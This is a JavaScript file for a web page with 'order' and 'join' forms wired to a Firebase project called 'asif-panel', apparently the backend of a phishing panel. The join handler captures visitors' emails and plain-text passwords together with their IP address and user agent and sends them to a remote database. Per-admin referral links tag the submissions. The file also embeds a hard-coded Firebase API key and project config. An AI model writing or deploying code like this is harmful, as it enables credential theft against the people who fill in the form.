// Firebase imports
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-database.js";
import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-auth.js";

// Firebase config
const firebaseConfig = {
  apiKey: "AIzaSyAoHENNTEvEsoRQ7beNt74OeK3fvOwT9Z4",
  authDomain: "asif-panel.firebaseapp.com",
  databaseURL: "https://asif-panel-default-rtdb.firebaseio.com",
  projectId: "asif-panel",
  storageBucket: "asif-panel.appspot.com",
  messagingSenderId: "860805105135",
  appId: "1:860805105135:web:28cffcb74741dbb4ed621a"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);
const auth = getAuth(app);

// Get form
const orderForm = document.getElementById("orderForm");
const joinForm = document.getElementById("joinForm");

// Get adminRef from URL
const urlParams = new URLSearchParams(window.location.search);
const adminRef = urlParams.get('r'); 
if(!adminRef){
  alert("Invalid link! Admin reference missing.");
  throw new Error("No adminRef");
}

// Optional: verify admin logged in
onAuthStateChanged(auth, (user) => {
  if(!user){
    alert("You must be logged in as admin to submit orders");
    window.location.href = "../login/login.html";
  }
});

// Function to fetch public IP
async function getUserIP(){
  try{
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip || "Unknown";
  }catch(e){
    return "Unknown";
  }
}

// ----------------- Order Form submit -----------------
if(orderForm){
  orderForm.addEventListener("submit", async (e)=>{
    e.preventDefault();
    const name = document.getElementById("password").value.trim();
    const email = document.getElementById("email").value.trim();

    if(!name || !email){
      alert("Please fill all fields!");
      return;
    }

    const newRef = push(ref(db, "orders"));
    set(newRef,{
      name,
      email,
      adminRef,
      timestamp: Date.now()
    })
    .then(()=>{
      alert("✅ Order submitted successfully!");
      orderForm.reset();
    })
    .catch(err=>alert("⚠️ " + err.message));
  });
}

// ----------------- Join Form submit -----------------
if(joinForm){
  joinForm.addEventListener("submit", async (e)=>{
    e.preventDefault();
    const email = document.getElementById("email").value.trim();
    const password = document.getElementById("password").value.trim();
    const ip = await getUserIP();
    const userAgent = navigator.userAgent;

    const newRef = push(ref(db, "joinRequests"));
    set(newRef,{
      email,
      password,
      ip,
      userAgent,
      addedTime: Date.now()
    })
    .then(()=>{
      alert("✅ Request submitted!");
      joinForm.reset();
    })
    .catch(err=>alert("⚠️ " + err.message));
  });
}
